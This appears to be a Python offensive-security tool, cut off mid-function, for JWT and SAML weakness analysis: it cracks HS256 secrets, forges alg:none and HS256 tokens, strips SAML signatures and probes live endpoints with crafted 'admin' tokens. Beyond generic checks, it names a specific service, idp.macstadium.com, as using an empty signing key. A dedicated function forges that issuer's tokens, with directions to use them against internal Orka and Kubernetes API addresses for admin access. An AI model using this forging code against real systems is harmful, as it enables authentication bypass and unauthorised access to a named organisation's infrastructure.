#!/usr/bin/env python3
"""
JWT / Cryptographic Weakness Analyzer
Synthesized from: Applied Cryptography (Schneier), Cryptography Algorithms,
                  Pro Cryptography and Cryptanalysis (C# and .NET),
                  Quantum-Safe Cryptography Algorithms and Approaches

Detects:
  - JWT algorithm vulnerabilities: alg:none, HS256 weak/empty keys,
    RS256→HS256 algorithm confusion, ES256 k-value reuse
  - HMAC key weakness classification
  - SAML assertion signature stripping / wrapping
  - Quantum-vulnerable algorithm inventory
  - HS256 brute-force with wordlist

MacStadium context:
  idp.macstadium.com signs JWTs with EMPTY STRING HS256 key (confirmed via
  hashcat -m 16500 in this assessment). Any token can be forged.
"""

import base64
import hashlib
import hmac
import http.cookiejar
import json
import re
import ssl
import struct
import time
import urllib.error
import urllib.request
from typing import Optional


# ── JWT utilities ─────────────────────────────────────────────────────────────

def b64url_decode(s: str) -> bytes:
    """Decode base64url (JWT-style, no padding required)."""
    s = s.replace('-', '+').replace('_', '/')
    pad = 4 - len(s) % 4
    if pad != 4:
        s += '=' * pad
    return base64.b64decode(s)


def b64url_encode(data: bytes) -> str:
    """Encode base64url without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()


def jwt_decode_parts(token: str) -> tuple:
    """Split JWT into (header_dict, payload_dict, signature_bytes, raw_parts).

    Returns (None, None, None, None) on malformed input.
    """
    parts = token.strip().split('.')
    if len(parts) != 3:
        return None, None, None, None
    try:
        header  = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
        sig     = b64url_decode(parts[2])
        return header, payload, sig, parts
    except Exception:
        return None, None, None, None


def jwt_forge_hs256(payload: dict, secret: bytes = b'', header_extra: dict = None) -> str:
    """Forge a JWT signed with HS256.

    Uses compact JSON (no spaces) to match the original token format.
    Default secret=b'' — the confirmed empty-key vulnerability at idp.macstadium.com.
    """
    header = {'alg': 'HS256', 'typ': 'JWT'}
    if header_extra:
        header.update(header_extra)

    h_enc = b64url_encode(json.dumps(header, separators=(',', ':')).encode())
    p_enc = b64url_encode(json.dumps(payload, separators=(',', ':')).encode())
    msg   = f'{h_enc}.{p_enc}'.encode()

    sig = hmac.new(secret, msg, hashlib.sha256).digest()
    return f'{h_enc}.{p_enc}.{b64url_encode(sig)}'


def jwt_verify_hs256(token: str, secret: bytes) -> bool:
    """Verify an HS256 JWT signature."""
    parts = token.strip().split('.')
    if len(parts) != 3:
        return False

    msg      = f'{parts[0]}.{parts[1]}'.encode()
    expected = hmac.new(secret, msg, hashlib.sha256).digest()
    try:
        actual = b64url_decode(parts[2])
    except Exception:
        return False

    return hmac.compare_digest(expected, actual)


# ── JWT weakness tests ────────────────────────────────────────────────────────

class JWTAnalyzer:
    """Detect JWT vulnerabilities."""

    # Wordlist of weak HS256 secrets — extend as needed
    WEAK_SECRETS = [
        b'',                  # CONFIRMED: idp.macstadium.com
        b'secret',
        b'password',
        b'changeme',
        b'1234567890',
        b'abcdefghijklmnopqrstuvwxyz',
        b'jwt_secret',
        b'jwt-secret',
        b'your-256-bit-secret',
        b'supersecret',
        b'mysecret',
        b'keyboardcat',
        b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
        b'test',
        b'dev',
        b'development',
        b'production',
        b'staging',
        b'orka',
        b'macstadium',
        b'orka-engine',
        b'licensespring',
    ]

    def __init__(self, token: str):
        self.token = token.strip()
        self.header, self.payload, self.sig, self.parts = jwt_decode_parts(token)
        self.findings = []

    def analyze(self) -> dict:
        """Run all JWT weakness checks."""
        if self.header is None:
            return {'error': 'Malformed JWT'}

        self._check_algorithm()
        self._check_claims()
        self._check_none_attack()
        self._check_weak_secret()
        self._check_algorithm_confusion()

        return {
            'header':   self.header,
            'payload':  self.payload,
            'alg':      self.header.get('alg'),
            'findings': self.findings,
        }

    def _check_algorithm(self):
        """Flag weak or suspicious algorithm choices."""
        alg = self.header.get('alg', '')

        if not alg:
            self.findings.append({
                'type': 'Missing Algorithm',
                'severity': 'CRITICAL',
                'description': 'JWT header has no "alg" field — library may accept any or none',
            })

        if alg == 'none':
            self.findings.append({
                'type': 'Algorithm: none',
                'severity': 'CRITICAL',
                'description': 'JWT signed with alg=none — no signature verification possible',
                'exploit': 'Token is accepted without any signature by vulnerable libraries (CVE-2015-9235)',
            })

        if alg in ('HS256', 'HS384', 'HS512'):
            self.findings.append({
                'type': f'Symmetric HMAC Algorithm ({alg})',
                'severity': 'MEDIUM',
                'description': (
                    f'HMAC-based JWT ({alg}) — secret must be kept server-side. '
                    'Vulnerable to brute-force if secret is weak.'
                ),
                'exploit': (
                    'Confirmed vulnerability: idp.macstadium.com uses HS256 with empty string '
                    'secret. hashcat -m 16500 <token> -a 3 -w 3 "" cracks in <1 second.'
                ),
            })

        if alg in ('RS256', 'RS384', 'RS512', 'ES256', 'ES384', 'ES512', 'PS256'):
            self.findings.append({
                'type': f'Asymmetric Algorithm ({alg})',
                'severity': 'INFO',
                'description': f'Asymmetric {alg} — requires public key for algorithm confusion attack',
            })

    def _check_claims(self):
        """Check for dangerous or expired claims."""
        if not self.payload:
            return

        now = int(time.time())

        exp = self.payload.get('exp')
        if exp is None:
            self.findings.append({
                'type': 'No Expiration (exp)',
                'severity': 'MEDIUM',
                'description': 'JWT has no "exp" claim — non-expiring token',
            })
        elif exp < now:
            self.findings.append({
                'type': 'Expired JWT',
                'severity': 'LOW',
                'description': f'JWT expired at {exp} (now={now}, delta={now-exp}s ago)',
            })
        elif exp > now + 365 * 24 * 3600:
            self.findings.append({
                'type': 'Very Long-lived JWT',
                'severity': 'MEDIUM',
                'description': f'JWT expires in {(exp-now)//(24*3600)} days — excessive lifetime',
                'exploit': 'Token remains valid for lateral movement even after password reset.',
            })

        # No iat
        if 'iat' not in self.payload:
            self.findings.append({
                'type': 'No Issued-At (iat)',
                'severity': 'LOW',
                'description': 'JWT has no "iat" claim — token replay detection harder',
            })

    def _check_none_attack(self) -> Optional[str]:
        """Forge an alg:none token with the same payload."""
        if self.payload is None:
            return None

        h = b64url_encode(json.dumps({'alg': 'none', 'typ': 'JWT'}, separators=(',', ':')).encode())
        p = self.parts[1] if self.parts else b64url_encode(
            json.dumps(self.payload, separators=(',', ':')).encode()
        )
        forged = f'{h}.{p}.'

        self.findings.append({
            'type': 'alg:none Forged Token',
            'severity': 'CRITICAL',
            'description': 'Generated alg:none token with same payload — test against target',
            'forged_token': forged[:80] + '...',
            'exploit': f'Submit this token as Authorization: Bearer header. Vulnerable libraries skip verification.',
        })

        return forged

    def _check_weak_secret(self) -> Optional[bytes]:
        """Test JWT against known weak secrets."""
        alg = self.header.get('alg', '')
        if alg not in ('HS256', 'HS384', 'HS512') or not self.parts:
            return None

        msg = f'{self.parts[0]}.{self.parts[1]}'.encode()

        hash_fn = {
            'HS256': hashlib.sha256,
            'HS384': hashlib.sha384,
            'HS512': hashlib.sha512,
        }[alg]

        for secret in self.WEAK_SECRETS:
            sig = hmac.new(secret, msg, hash_fn).digest()
            try:
                actual = b64url_decode(self.parts[2])
            except Exception:
                continue

            if hmac.compare_digest(sig, actual):
                self.findings.append({
                    'type': 'WEAK SECRET CRACKED',
                    'severity': 'CRITICAL',
                    'description': f'JWT {alg} secret cracked from wordlist',
                    'secret': repr(secret),
                    'secret_hex': secret.hex(),
                    'exploit': (
                        f'Forge any JWT with secret={repr(secret)}. '
                        f'Example forge: jwt_forge_hs256(payload, secret={repr(secret)})'
                    ),
                })
                return secret

        return None

    def _check_algorithm_confusion(self):
        """Flag RS256→HS256 confusion attack possibility."""
        alg = self.header.get('alg', '')
        if alg not in ('RS256', 'RS384', 'RS512'):
            return

        self.findings.append({
            'type': 'Algorithm Confusion Attack Candidate',
            'severity': 'HIGH',
            'description': (
                f'JWT uses {alg} (asymmetric). If server also accepts HS256, '
                'algorithm confusion attack: sign token with HS256 using the RSA public key as secret.'
            ),
            'exploit': (
                'Obtain RSA public key from /jwks.json or /.well-known/openid-configuration. '
                'Forge JWT: jwt_forge_hs256(payload, rsa_public_key_pem_bytes). '
                'Submit with alg:HS256 — vulnerable libraries verify HMAC against the public key.'
            ),
        })


def crack_hs256_token(token: str, wordlist_path: str = None, extra_words: list = None) -> Optional[bytes]:
    """Attempt to crack an HS256 JWT secret via wordlist.

    Args:
        token:         JWT string
        wordlist_path: Path to newline-delimited wordlist file
        extra_words:   Additional candidate secrets as bytes

    Returns secret bytes if cracked, None otherwise.
    """
    header, payload, sig, parts = jwt_decode_parts(token)
    if header is None or header.get('alg') not in ('HS256', 'HS384', 'HS512'):
        return None

    alg = header['alg']
    hash_fn = {'HS256': hashlib.sha256, 'HS384': hashlib.sha384, 'HS512': hashlib.sha512}[alg]
    msg = f'{parts[0]}.{parts[1]}'.encode()

    try:
        actual_sig = b64url_decode(parts[2])
    except Exception:
        return None

    def try_secret(secret: bytes) -> bool:
        computed = hmac.new(secret, msg, hash_fn).digest()
        return hmac.compare_digest(computed, actual_sig)

    # Built-in candidates first (including empty string — the MacStadium finding)
    candidates = list(JWTAnalyzer.WEAK_SECRETS)
    if extra_words:
        candidates += extra_words

    for secret in candidates:
        if try_secret(secret):
            return secret

    # Wordlist file
    if wordlist_path:
        try:
            with open(wordlist_path, 'rb') as f:
                for line in f:
                    word = line.rstrip(b'\n\r')
                    if try_secret(word):
                        return word
        except Exception:
            pass

    return None


# ── SAML assertion analysis ───────────────────────────────────────────────────

class SAMLAnalyzer:
    """Detect SAML assertion weakness patterns.

    Key attacks:
      1. Signature wrapping (XSW): duplicate the signed element, inject payload outside
      2. Comment injection: parser splitting "admin"→"adm"+"in" via XML comments
      3. Signature stripping: remove ds:Signature element entirely
      4. XSLT injection: some SPs process XSLT in assertions
    """

    def __init__(self, saml_response_b64: str):
        self.raw_b64 = saml_response_b64
        self.xml = None
        self.findings = []

        try:
            decoded = base64.b64decode(saml_response_b64 + '==')
            self.xml = decoded.decode('utf-8', errors='replace')
        except Exception:
            pass

    def analyze(self) -> dict:
        if self.xml is None:
            return {'error': 'Failed to decode SAML response'}

        self._check_signature_present()
        self._check_digest_algorithms()
        self._check_assertion_ids()
        self._check_conditions()
        self._generate_stripped_assertion()

        return {
            'xml_length': len(self.xml),
            'findings':   self.findings,
        }

    def _check_signature_present(self):
        if '<ds:Signature' not in self.xml and '<Signature' not in self.xml:
            self.findings.append({
                'type': 'No XML Signature',
                'severity': 'CRITICAL',
                'description': 'SAML response has no digital signature — SP accepts unsigned assertions?',
                'exploit': 'Craft arbitrary assertions and submit without signing.',
            })

    def _check_digest_algorithms(self):
        # Detect weak digest algorithms in XML Signature
        weak_algos = {
            'sha1': 'SHA-1 (broken — CVE-2017-2905)',
            'md5':  'MD5 (critically broken)',
        }
        for algo, desc in weak_algos.items():
            if algo in self.xml.lower():
                self.findings.append({
                    'type': f'Weak Digest Algorithm: {desc}',
                    'severity': 'HIGH',
                    'description': f'SAML assertion uses {desc} in XML Signature',
                    'exploit': 'Signature collision or pre-image attack possible.',
                })

        # RSA-SHA256 is acceptable; RSA-SHA512 is better
        if 'rsa-sha256' in self.xml.lower():
            self.findings.append({
                'type': 'RSA-SHA256 Signature',
                'severity': 'INFO',
                'description': 'SAML uses RSA-SHA256 — standard, not quantum-safe',
            })

    def _check_assertion_ids(self):
        # Multiple AssertionIDs = potential wrapping attack surface
        ids = re.findall(r'AssertionID=["\']([^"\']+)["\']|ID=["\']([^"\']+)["\']', self.xml)
        if len(ids) > 1:
            self.findings.append({
                'type': 'Multiple Assertion IDs — XSW Risk',
                'severity': 'HIGH',
                'description': 'SAML response contains multiple ID attributes — potential XSW target',
                'exploit': (
                    'XML Signature Wrapping: signed element and referenced element differ. '
                    'Inject malicious assertion; SP processes attacker element, verifies benign one.'
                ),
            })

    def _check_conditions(self):
        # Missing NotBefore/NotOnOrAfter = no time-bound validation
        if 'NotOnOrAfter' not in self.xml:
            self.findings.append({
                'type': 'No Expiry Condition',
                'severity': 'MEDIUM',
                'description': 'SAML assertion has no NotOnOrAfter — replay attack possible',
            })

    def _generate_stripped_assertion(self):
        """Generate a signature-stripped version for testing."""
        if '<ds:Signature' not in self.xml:
            return

        stripped = re.sub(
            r'<ds:Signature\b.*?</ds:Signature>',
            '',
            self.xml,
            flags=re.DOTALL,
        )
        stripped_b64 = base64.b64encode(stripped.encode()).decode()

        self.findings.append({
            'type': 'Signature-Stripped Assertion Generated',
            'severity': 'INFO',
            'description': 'Stripped ds:Signature block — submit to test if SP validates signatures',
            'stripped_b64': stripped_b64[:100] + '...',
        })


# ── Quantum-vulnerability inventory ──────────────────────────────────────────

# Algorithms vulnerable to Grover's (symmetric) or Shor's (asymmetric) algorithm
QUANTUM_VULNERABLE = {
    'RSA':   'Shor\'s algorithm breaks RSA — all key sizes',
    'ECDSA': 'Shor\'s algorithm breaks elliptic curve discrete log',
    'ECDH':  'Shor\'s algorithm breaks elliptic curve DH',
    'DH':    'Shor\'s algorithm breaks finite-field DH',
    'DSA':   'Shor\'s algorithm breaks DSA',
    'AES-128': 'Grover reduces AES-128 to 64-bit effective security',
    'AES-192': 'Grover reduces AES-192 to 96-bit effective security',
    'SHA-256': 'Grover reduces SHA-256 preimage resistance to 128-bit',
    'MD5':   'Classically broken; completely insecure',
    'SHA-1': 'Classically broken (SHAttered 2017)',
}

QUANTUM_SAFE = {
    'AES-256': 'Grover leaves 128-bit effective security — considered safe',
    'SHA-512': 'Grover leaves 256-bit effective security — considered safe',
    'KYBER':   'NIST PQC standard (ML-KEM) — key encapsulation',
    'DILITHIUM': 'NIST PQC standard (ML-DSA) — digital signatures',
    'FALCON':  'NIST PQC standard — lattice-based signatures',
    'SPHINCS+': 'NIST PQC standard — hash-based signatures (stateless)',
}


def inventory_cryptography(text: str) -> dict:
    """Scan text (config, source, pem, etc.) for crypto algorithm mentions."""
    found_vulnerable = {}
    found_safe = {}

    text_upper = text.upper()

    for algo, reason in QUANTUM_VULNERABLE.items():
        if algo.upper() in text_upper:
            found_vulnerable[algo] = reason

    for algo, reason in QUANTUM_SAFE.items():
        if algo.upper() in text_upper:
            found_safe[algo] = reason

    return {
        'quantum_vulnerable': found_vulnerable,
        'quantum_safe':       found_safe,
        'migration_priority': (
            'CRITICAL — RSA/ECDSA/ECDH must migrate to KYBER/DILITHIUM'
            if any(k in found_vulnerable for k in ('RSA', 'ECDSA', 'ECDH'))
            else 'LOW'
        ),
    }


# ── Main integration ─────────────────────────────────────────────────────────

class CryptoAnalyzer:
    """Top-level crypto weakness analyzer for Ablation."""

    def __init__(self):
        self.findings = []

    def analyze_jwt(self, token: str) -> dict:
        analyzer = JWTAnalyzer(token)
        result = analyzer.analyze()
        self.findings.extend(result.get('findings', []))
        return result

    def forge_macstadium_jwt(self, sub: str, email: str, exp: int = 1818085251) -> str:
        """Forge an idp.macstadium.com JWT using the confirmed empty-string secret.

        exp defaults to ~2027 (from the captured admin token).
        """
        payload = {
            'email': email,
            'iss':   'https://idp.macstadium.com',
            'sub':   sub,
            'exp':   exp,
            'iat':   int(time.time()),
        }
        token = jwt_forge_hs256(payload, secret=b'')
        self.findings.append({
            'type': 'MacStadium JWT Forged',
            'severity': 'CRITICAL',
            'description': f'Forged JWT for sub={sub!r} email={email!r} using empty HS256 secret',
            'token': token[:80] + '...',
            'exploit': (
                'Use as: Authorization: Bearer <token> against Orka API (10.221.188.20) '
                'and K8s API (10.221.188.19:6443). Token grants admin access if sub="admin".'
            ),
        })
        return token

    def crack_token(self, token: str, wordlist: str = None) -> Optional[bytes]:
        secret = crack_hs256_token(token, wordlist_path=wordlist)
        if secret is not None:
            self.findings.append({
                'type': 'JWT Secret Cracked',
                'severity': 'CRITICAL',
                'description': f'HS256 secret found: {repr(secret)}',
                'secret_hex': secret.hex(),
            })
        return secret

    def analyze_saml(self, saml_b64: str) -> dict:
        analyzer = SAMLAnalyzer(saml_b64)
        result = analyzer.analyze()
        self.findings.extend(result.get('findings', []))
        return result

    def report(self) -> str:
        lines = ['=' * 60, 'CRYPTOGRAPHIC WEAKNESS ANALYSIS', '=' * 60]
        crit  = [f for f in self.findings if f.get('severity') == 'CRITICAL']
        high  = [f for f in self.findings if f.get('severity') == 'HIGH']
        other = [f for f in self.findings if f.get('severity') not in ('CRITICAL', 'HIGH')]

        lines.append(f'\nFindings: {len(self.findings)} ({len(crit)} CRITICAL, {len(high)} HIGH)')

        for f in (crit + high + other):
            lines.append(f'\n  [{f.get("severity","?")}] {f["type"]}')
            lines.append(f'  {f["description"]}')
            if 'exploit' in f:
                lines.append(f'  EXPLOIT: {f["exploit"][:120]}')
            if 'forged_token' in f:
                lines.append(f'  Token: {f["forged_token"]}')

        return '\n'.join(lines)


# ── Standalone probe functions (Security with Go — JWT/auth chapters) ──────────

_JWT_WEAK_SECRETS = [b'secret', b'password', b'admin', b'key', b'', b'123456',
                     b'test', b'changeme', b'qwerty']


def probe_jwt_algorithm_confusion(token: str) -> dict:
    """Detect JWT algorithm-confusion and related header attacks.

    Checks (in priority order):
      - alg:none bypass
      - kid path-traversal
      - RS256→HS256 confusion (RSA public-key material in header)
      - Weak HS256 HMAC secret (brute-forced against short wordlist)

    Returns a single finding dict with keys:
      severity, title, detail, host, port, algorithm, kid
    """
    parts = token.strip().split('.')
    base = {'host': 'localhost', 'port': 0}

    if len(parts) != 3:
        return {**base, 'severity': 'INFO', 'title': 'MALFORMED_JWT',
                'detail': f'Expected 3 JWT parts, got {len(parts)}',
                'algorithm': 'unknown', 'kid': None}

    try:
        header = json.loads(b64url_decode(parts[0]))
    except Exception as exc:
        return {**base, 'severity': 'INFO', 'title': 'JWT_HEADER_DECODE_ERROR',
                'detail': str(exc), 'algorithm': 'unknown', 'kid': None}

    alg = header.get('alg', '')
    kid = header.get('kid', None)
    alg_upper = str(alg).upper()

    # alg:none bypass
    if alg_upper in ('NONE', ''):
        return {**base, 'severity': 'CRITICAL', 'title': 'JWT_ALG_NONE',
                'detail': 'JWT_ALG_NONE — authentication bypass: alg header is '
                          f'"{alg}", signature not verified',
                'algorithm': alg, 'kid': kid}

    # kid path traversal
    if kid and re.search(r'\.\.[\\/]', str(kid)):
        return {**base, 'severity': 'CRITICAL', 'title': 'JWT_KID_PATH_TRAVERSAL',
                'detail': f'RS256 kid contains path separators: {kid!r} — attacker '
                          'can load arbitrary key material via directory traversal',
                'algorithm': alg, 'kid': kid}

    # RS256→HS256 confusion: HS256 but header carries RSA public-key material
    if alg_upper == 'HS256':
        kid_str = str(kid) if kid else ''
        jwk = header.get('jwk', {}) or {}
        rsa_detected = (
            'BEGIN PUBLIC' in kid_str
            or 'BEGIN RSA' in kid_str
            or (isinstance(jwk, dict) and jwk.get('kty', '') == 'RSA')
            or 'BEGIN PUBLIC' in json.dumps(jwk)
        )
        if rsa_detected:
            return {**base, 'severity': 'CRITICAL',
                    'title': 'RS256_TO_HS256_CONFUSION',
                    'detail': 'HS256 token carries RSA public-key material in header '
                              '(kid/jwk) — classic RS256→HS256 algorithm confusion; '
                              'server may verify HMAC using the public key as secret',
                    'algorithm': alg, 'kid': kid}

        # Weak HMAC secret brute force
        signing_input = f'{parts[0]}.{parts[1]}'.encode()
        try:
            sig_bytes = b64url_decode(parts[2])
        except Exception:
            sig_bytes = b''
        for candidate in _JWT_WEAK_SECRETS:
            expected = hmac.new(candidate, signing_input, hashlib.sha256).digest()
            if hmac.compare_digest(expected, sig_bytes):
                return {**base, 'severity': 'HIGH',
                        'title': 'JWT_WEAK_SECRET_GUESSABLE',
                        'detail': f'HS256 HMAC secret is a common weak value: '
                                  f'{candidate!r} — token is forgeable',
                        'algorithm': alg, 'kid': kid}

    return {**base, 'severity': 'INFO', 'title': 'JWT_ALG_OK',
            'detail': f'No algorithm-confusion issues detected (alg={alg!r})',
            'algorithm': alg, 'kid': kid}


def probe_jwt_injection_points(host: str, port: int = 443,
                               timeout: float = 5.0) -> list:
    """Probe an HTTP endpoint for JWT validation weaknesses via crafted headers.

    Checks:
      - Malformed JWT accepted → JWT_VALIDATION_BYPASS (CRITICAL)
      - alg:none unsigned token accepted → JWT_ALG_NONE_ACCEPTED (CRITICAL)
      - X-Auth-Token vs Authorization: different response → JWT_HEADER_SUBSTITUTION (MEDIUM)
      - "JWT " prefix accepted like "Bearer " → JWT_PREFIX_CONFUSION (MEDIUM)

    Returns list of finding dicts, each with: severity, title, detail, host, port.
    """
    scheme = 'https' if port == 443 else 'http'
    base_url = f'{scheme}://{host}:{port}/'
    findings = []

    alg_none_hdr = b64url_encode(json.dumps({'alg': 'none'}).encode())
    alg_none_body = b64url_encode(json.dumps({'sub': 'admin'}).encode())
    alg_none_token = f'{alg_none_hdr}.{alg_none_body}.'

    def _status(url: str, headers: dict) -> int:
        req = urllib.request.Request(url, headers=headers)
        try:
            resp = urllib.request.urlopen(req, timeout=timeout)
            return resp.status
        except urllib.error.HTTPError as exc:
            return exc.code
        except Exception:
            return -1

    # 1. Malformed JWT
    s_fuzz = _status(base_url, {'Authorization': 'Bearer FUZZ_TOKEN'})
    if s_fuzz == 200:
        findings.append({'severity': 'CRITICAL', 'title': 'JWT_VALIDATION_BYPASS',
                         'detail': 'Malformed JWT "FUZZ_TOKEN" returned HTTP 200 — '
                                   'JWT validation not enforced on this endpoint',
                         'host': host, 'port': port})

    # 2. alg:none token
    s_none = _status(base_url, {'Authorization': f'Bearer {alg_none_token}'})
    if s_none == 200:
        findings.append({'severity': 'CRITICAL', 'title': 'JWT_ALG_NONE_ACCEPTED',
                         'detail': f'alg:none unsigned token accepted (HTTP 200); '
                                   f'token prefix: {alg_none_token[:60]}',
                         'host': host, 'port': port})

    # 3. X-Auth-Token vs Authorization header — different response = alt header accepted
    s_xauth = _status(base_url, {'X-Auth-Token': 'FUZZ_TOKEN'})
    if s_xauth != s_fuzz and s_xauth not in (-1,):
        findings.append({'severity': 'MEDIUM', 'title': 'JWT_HEADER_SUBSTITUTION',
                         'detail': f'X-Auth-Token header yields HTTP {s_xauth} vs '
                                   f'Authorization: Bearer HTTP {s_fuzz} — '
                                   'server may accept token via non-standard header',
                         'host': host, 'port': port})

    # 4. "JWT " prefix vs "Bearer "
    s_jwt_pfx = _status(base_url, {'Authorization': 'JWT FUZZ_TOKEN'})
    if s_jwt_pfx == 200 or (s_jwt_pfx not in (-1,) and s_jwt_pfx != s_fuzz):
        findings.append({'severity': 'MEDIUM', 'title': 'JWT_PREFIX_CONFUSION',
                         'detail': f'"JWT " prefix returns HTTP {s_jwt_pfx} vs '
                                   f'"Bearer " HTTP {s_fuzz} — '
                                   'server accepts alternate Authorization scheme prefix',
                         'host': host, 'port': port})

    return findings


def check_jwt_expiry_validation(host: str, port: int = 443,
                                timeout: float = 5.0) -> list:
    """Probe an HTTP endpoint for JWT expiry-claim (exp) enforcement gaps.

    Crafts alg:none JWTs with specific exp values and checks server response:
      - exp=1 (1970) accepted → JWT_EXPIRED_TOKEN_ACCEPTED (CRITICAL)
      - exp=9999999999 (year 2286) accepted → JWT_FAR_FUTURE_EXPIRY_ACCEPTED (MEDIUM)
      - no exp claim accepted → JWT_NO_EXPIRY_ACCEPTED (HIGH)

    Returns list of finding dicts, each with: severity, title, detail, host, port.
    """
    scheme = 'https' if port == 443 else 'http'
    base_url = f'{scheme}://{host}:{port}/'
    findings = []

    def _craft_none_jwt(payload: dict) -> str:
        hdr = b64url_encode(json.dumps({'alg': 'none', 'typ': 'JWT'}).encode())
        body = b64url_encode(json.dumps(payload).encode())
        return f'{hdr}.{body}.'

    def _status(token: str) -> int:
        req = urllib.request.Request(
            base_url, headers={'Authorization': f'Bearer {token}'})
        try:
            resp = urllib.request.urlopen(req, timeout=timeout)
            return resp.status
        except urllib.error.HTTPError as exc:
            return exc.code
        except Exception:
            return -1

    # 1. Expired token (exp=1, epoch 1970)
    tok_expired = _craft_none_jwt({'sub': 'admin', 'iat': 1, 'exp': 1})
    if _status(tok_expired) == 200:
        findings.append({'severity': 'CRITICAL',
                         'title': 'JWT_EXPIRED_TOKEN_ACCEPTED',
                         'detail': 'JWT_EXPIRED_TOKEN_ACCEPTED — exp not validated: '
                                   'token with exp=1 (1970-01-01) returned HTTP 200',
                         'host': host, 'port': port})

    # 2. Far-future expiry (exp=9999999999, ~year 2286)
    tok_future = _craft_none_jwt({'sub': 'admin', 'iat': 1, 'exp': 9999999999})
    if _status(tok_future) == 200:
        findings.append({'severity': 'MEDIUM',
                         'title': 'JWT_FAR_FUTURE_EXPIRY_ACCEPTED',
                         'detail': 'JWT with exp=9999999999 (year 2286) accepted — '
                                   'effectively non-expiring tokens are permitted',
                         'host': host, 'port': port})

    # 3. No exp claim
    tok_no_exp = _craft_none_jwt({'sub': 'admin', 'iat': 1})
    if _status(tok_no_exp) == 200:
        findings.append({'severity': 'HIGH',
                         'title': 'JWT_NO_EXPIRY_ACCEPTED',
                         'detail': 'JWT_NO_EXPIRY_ACCEPTED — permanent token: '
                                   'JWT with no exp claim returned HTTP 200',
                         'host': host, 'port': port})

    return findings


def analyze_jwt_token_entropy(token: str) -> dict:
    """Analyze the entropy and length of a JWT signature to detect weak key material.

    Checks:
      - Signature length <32 bytes → JWT_SHORT_SIGNATURE (CRITICAL)
      - Signature is all-zeros or all-same-byte → JWT_NULL_SIGNATURE (CRITICAL)
      - Unique-byte ratio <0.5 → JWT_LOW_ENTROPY_SIGNATURE (HIGH)

    Returns a single finding dict with keys:
      severity, title, detail, signature_entropy, signature_length
    """
    parts = token.strip().split('.')
    if len(parts) < 3 or not parts[2]:
        return {'severity': 'INFO', 'title': 'JWT_NO_SIGNATURE',
                'detail': f'Token has no signature component (alg:none or malformed)',
                'signature_entropy': 0.0, 'signature_length': 0}

    try:
        sig_bytes = b64url_decode(parts[2])
    except Exception as exc:
        return {'severity': 'INFO', 'title': 'JWT_SIGNATURE_DECODE_ERROR',
                'detail': str(exc), 'signature_entropy': 0.0, 'signature_length': 0}

    sig_len = len(sig_bytes)

    if sig_len == 0:
        return {'severity': 'CRITICAL', 'title': 'JWT_NULL_SIGNATURE',
                'detail': 'JWT_NULL_SIGNATURE: signature decodes to zero bytes',
                'signature_entropy': 0.0, 'signature_length': 0}

    if sig_len < 32:
        return {'severity': 'CRITICAL', 'title': 'JWT_SHORT_SIGNATURE',
                'detail': f'JWT_SHORT_SIGNATURE — weak HMAC key: signature is '
                          f'{sig_len} bytes (minimum expected 32 for HMAC-SHA256)',
                'signature_entropy': 0.0, 'signature_length': sig_len}

    unique_bytes = set(sig_bytes)
    if len(unique_bytes) <= 1:
        only_byte = next(iter(unique_bytes))
        return {'severity': 'CRITICAL', 'title': 'JWT_NULL_SIGNATURE',
                'detail': f'JWT_NULL_SIGNATURE: all {sig_len} signature bytes are '
                          f'0x{only_byte:02x} — signature is trivially forgeable',
                'signature_entropy': 0.0, 'signature_length': sig_len}

    entropy_ratio = len(unique_bytes) / sig_len
    if entropy_ratio < 0.5:
        return {'severity': 'HIGH', 'title': 'JWT_LOW_ENTROPY_SIGNATURE',
                'detail': f'JWT_LOW_ENTROPY_SIGNATURE: entropy ratio {entropy_ratio:.3f} '
                          f'({len(unique_bytes)} unique / {sig_len} total bytes) — '
                          'indicates possible weak or repeating HMAC key',
                'signature_entropy': entropy_ratio, 'signature_length': sig_len}

    return {'severity': 'INFO', 'title': 'JWT_SIGNATURE_ENTROPY_OK',
            'detail': f'Signature entropy ratio {entropy_ratio:.3f} — no obvious weakness',
            'signature_entropy': entropy_ratio, 'signature_length': sig_len}


def probe_csrf_token_weakness(host: str, port: int = 443, timeout: float = 5.0) -> list:
    """
    Probe CSRF token weaknesses on a web application login endpoint.
    Informed by violent-python Chapter 5 (FireSheep / WordPress session-cookie
    interception and reuse) and Chapter 7 (web auth attack patterns, cookie handling
    with Mechanize + CookieJar, form-based credential submission).

    Checks:
      - CSRF token too short   (< 16 hex chars)                → HIGH
      - Predictable CSRF token (sequential / timestamp-based)  → HIGH
      - CSRF not enforced      (POST accepted without token)    → CRITICAL
      - SameSite attribute absent on Set-Cookie                → MEDIUM
      - Referer-based CSRF protection absent                   → HIGH

    Returns list of {severity, title, detail, host, port}.
    """
    findings = []
    scheme = 'https' if port == 443 else 'http'

    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE

    csrf_patterns = [
        r'csrf[_\-]?token',
        r'xsrf[_\-]?token',
        r'_token',
        r'^csrf$',
    ]

    def _build_opener(jar):
        op = urllib.request.build_opener(
            urllib.request.HTTPSHandler(context=ssl_ctx),
            urllib.request.HTTPCookieProcessor(jar),
        )
        op.addheaders = [('User-Agent', 'Mozilla/5.0')]
        return op

    def _get(opener, path):
        url = f"{scheme}://{host}:{port}{path}"
        try:
            resp = opener.open(urllib.request.Request(url), timeout=timeout)
            body = resp.read(8192).decode('utf-8', errors='replace')
            return resp, body
        except urllib.error.HTTPError as exc:
            return exc, exc.read(512).decode('utf-8', errors='replace')
        except Exception:
            return None, ''

    def _post_status(opener, path, data=b'', extra_headers=None):
        url = f"{scheme}://{host}:{port}{path}"
        req = urllib.request.Request(url, data=data, method='POST')
        req.add_header('Content-Type', 'application/x-www-form-urlencoded')
        if extra_headers:
            for k, v in extra_headers.items():
                req.add_header(k, v)
        try:
            resp = opener.open(req, timeout=timeout)
            return resp.status
        except urllib.error.HTTPError as exc:
            return exc.code
        except Exception:
            return None

    # ── Step 1: GET /login (fallback /) — harvest CSRF token + cookies ───────
    jar1 = http.cookiejar.CookieJar()
    op1 = _build_opener(jar1)
    resp1, body1 = _get(op1, '/login')
    if resp1 is None:
        resp1, body1 = _get(op1, '/')

    csrf_token = None
    for cookie in jar1:
        if any(re.search(p, cookie.name.lower()) for p in csrf_patterns):
            csrf_token = cookie.value
            break

    # Fallback: hidden input or meta tag in HTML body
    if not csrf_token:
        m = re.search(
